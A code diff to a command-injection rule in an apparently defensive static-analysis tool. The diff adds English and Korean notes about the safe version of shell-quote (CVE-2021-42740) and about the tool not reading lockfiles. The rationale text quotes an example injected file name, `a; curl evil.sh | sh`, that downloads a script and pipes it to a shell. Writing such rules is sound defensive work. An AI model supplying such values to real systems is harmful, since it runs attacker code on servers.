@@ -220,8 +220,8 @@ export const SOURCE_RULES = [
       cert: [{ kind: "via-cwe", id: "IDS07-J", cwe: "CWE-78" }],
     },
     rationale: {
-      en: "A command string built from request data and run through a shell (`exec`, `execSync`, or `spawn` with `shell: true`) lets an attacker append commands with `;`, `&&`, `|` or `$(...)`. A file name such as `a; curl evil.sh | sh` then runs with the privileges of the server process.",
-      ko: "요청 데이터로 만든 명령 문자열을 셸을 통해 실행하면(`exec`, `execSync`, `shell: true`인 `spawn`) 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙일 수 있습니다. 예를 들어 파일 이름이 `a; curl evil.sh | sh`이면 서버 프로세스의 권한으로 실행됩니다.",
+      en: "A command string built from request data and run through a shell (`exec`, `execSync`, or `spawn` with `shell: true`) lets an attacker append commands with `;`, `&&`, `|` or `$(...)`. A file name such as `a; curl evil.sh | sh` then runs with the privileges of the server process. PGARD trusts `shell-quote`'s `quote()` only from 1.7.3 on (CVE-2021-42740) and does not read your lockfile, so check the version.",
+      ko: "요청 데이터로 만든 명령 문자열을 셸을 통해 실행하면(`exec`, `execSync`, `shell: true`인 `spawn`) 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙일 수 있습니다. 예를 들어 파일 이름이 `a; curl evil.sh | sh`이면 서버 프로세스의 권한으로 실행됩니다. PGARD는 `shell-quote`의 `quote()`를 1.7.3 이상에서만 안전하다고 보며(CVE-2021-42740) 잠금 파일은 읽지 않으니 버전을 확인하세요.",
     },
     remediation: {
       en: "Do not use a shell. Call `execFile('git', ['log', '--end-of-options', ref, '--'])` or `spawn` with an argument array, so each argument is passed as-is and never parsed by a shell. Validate arguments against an allowlist, and tell the program where options end (`--end-of-options` for git 2.24+, or `--` for programs that support it) so a user value cannot be read as an option.",
